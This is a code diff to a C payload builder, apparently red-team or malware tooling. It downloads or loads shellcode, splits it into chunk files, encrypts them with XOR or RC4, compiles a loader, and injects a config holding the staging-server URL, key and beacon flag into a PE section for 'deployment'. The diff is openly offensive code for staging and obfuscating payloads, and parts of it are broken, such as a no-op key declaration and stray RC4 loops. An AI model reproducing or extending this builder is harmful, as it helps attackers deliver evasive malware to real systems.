@@ -4,17 +4,14 @@
 #include "Core/Include/Cmd.h"
 #include "Core/Include/Pe.h"
 #include "Core/Include/Banner.h"
+#include "Core/Include/Crypto.h"
+#include "Core/Include/Utils.h"
 #include "KindlyBuilder.h"
 
 #include "Core/Include/Utils.h"
 
 // TODO Move to Crytpo.c file
-BOOL EncryptXOR(IN OUT PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey) { // Move to file with different algorithms
-    for (size_t i = 0; i < sShellcodeSize; i++){
-        pShellcode[i] = pShellcode[i] ^ bKey;
-    }
-    return TRUE;
-}
+
 
 BUILDER myBuilder = { 0 };
 
@@ -34,7 +31,15 @@ BOOL BuildPayload() {
     WCHAR           wcExt[MAX_PATH];
     WCHAR           wcOutputDirectory[MAX_PATH];
 
-    HttpDownloadPayload(Builder->PayloadSize, &pRawPayloadBuffer, &dwPayloadSize);
+    if (Builder->isLocalPayload) {
+        printf("[+] Loading Local Payload %ls\n", Builder->RemotePayloadURL);
+        ReadFileIntoBuffer(&pRawPayloadBuffer, Builder->LocalPayloadFilePath);
+    } else {
+        printf("[+] Fetching Remote Payload %ls\n", Builder->RemotePayloadURL);
+        HttpDownloadPayload(Builder->PayloadSize, &pRawPayloadBuffer, &dwPayloadSize);
+    }
+
+    printf("[+] Payload Size %lu\n", Builder->PayloadSize);
 
     // TODO Have option to read beginning->end of payload or end->beginning of payload.
     // TODO If dwChunkSize is not full number than round up or down (this option will be added in command line to round up or down chunks)
@@ -54,11 +59,24 @@ BOOL BuildPayload() {
         WCHAR filename[MAX_PATH];
         swprintf(filename, sizeof(filename) / sizeof(WCHAR), L"%ls%d.txt", wcOutputDirectory, i);
         HANDLE hFile = CreateFileW(filename, GENERIC_ALL, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
-        printf("[+] Chunk %d Filename %ls\n", i, filename);
 
         // Encrypt
+        if (Builder->EncryptionMethod == ENCRYPTION_XOR) {
+            XOR(pTempBuffer, Builder->ChunkSize, Builder->EncryptionKey);
+        }
+        else if (Builder->EncryptionMethod == ENCRYPTION_RC4) {
+            UCHAR s[ 256 ] = { 0 }, s2[ 256 ] = { 0 }; // S-box
+            INT i;
+            RC4Init(s, (unsigned char *)Builder->EncryptionKey, strlen(Builder->EncryptionKey)); // Has completed the initialization
+            for (i = 0 ; i< 256 ; i++ ) {
+                if (i && (i + 1 )% 16 == 0 )putchar( ' \n ' );
+            }
+            for (i = 0 ; i< 256 ; i++) { // Use s2[i] to temporarily reserve the initialized s[i], it is very important! ! !
+                s2[i] = s[i];
+            }
+            RC4(s, pTempBuffer, Builder->ChunkSize); // Encryption
+        }
 
-        EncryptXOR(pTempBuffer, Builder->ChunkSize, Builder->EncryptionKey);
         DWORD dwBytesWritten = 0;
         WriteFile(hFile, pTempBuffer, Builder->ChunkSize, &dwBytesWritten, NULL);
         dwTotalBytesWritten += dwBytesWritten;
@@ -105,26 +123,26 @@ int main(int argc, char *argv[])
     Builder->PayloadOutputDirectory     = NULL;
     Builder->RemotePayloadURL           = NULL;
     Builder->StagingURL                 = NULL;
+    Builder->EncryptionKey              [256];
     Builder->PayloadSize                = 0;
     Builder->ChunkCount                 = 0;
-    Builder->EncryptionKey              = 0x51; // TODO change this so that it's passed through command line.
 
     if (!HandleArgs(argc, argv)) {
         printf("Handle Args Failed");
         return 0;
     }
     PrintBanner();
-    printf("[+] Fetching Remote Payload %ls\n", Builder->RemotePayloadURL);
-    printf("[+] Payload Size %lu\n", Builder->PayloadSize);
+
     printf("[+] Using Encryption Method %d\n", Builder->EncryptionMethod);
+    printf("[+] Using Encryption Key %s\n", Builder->EncryptionKey);
     printf("[+] Setting Staging Server to %ls\n", Builder->StagingURL);
     printf("[+] Chunk (file) Count %lu\n", Builder->ChunkCount);
     printf("[+] Output Directory %ls\n", Builder->PayloadOutputDirectory);
 
     BuildPayload();
 
-    CHAR cJsonData[1024];
-    sprintf(cJsonData, "{\"1\": \"%lu\", \"2\": \"%c\", \"3\": \"%ls\", \"4\": \"%lu\", \"5\": \"%d\"}\0", Builder->PayloadSize, Builder->EncryptionKey, Builder->StagingURL, Builder->ChunkCount, Builder->isBeacon);
+    CHAR cJsonData[2024];
+    sprintf(cJsonData, "{\"1\": \"%lu\", \"2\": \"%d\", \"3\": \"%s\", \"4\": \"%ls\", \"5\": \"%lu\", \"6\": \"%d\"}\0", Builder->PayloadSize, Builder->EncryptionMethod, Builder->EncryptionKey, Builder->StagingURL, Builder->ChunkCount, Builder->isBeacon);
     printf("[+] Built Payload Config: %s\n", cJsonData);
     Compile();
     printf("[+] Compiled Payload %ls\n", Builder->PayloadOutputDirectory);
@@ -132,7 +150,7 @@ int main(int argc, char *argv[])
     AddPESection(Builder->PayloadOutputDirectory);
     printf("[+] Injecting Section to l%ls (.TEST)\n", Builder->PayloadOutputDirectory);
     AddDataToSection(Builder->PayloadOutputDirectory, cJsonData);
-    printf("[+] Config Injected to PE Section Successfully");
+    printf("[+] Config Injected to PE Section Successfully\n");
     printf("[+] Payload ready for deployment! \n[+] Make sure to transfer chunk files to remote host %ls \n", Builder->RemotePayloadURL);
     return 0;
 }
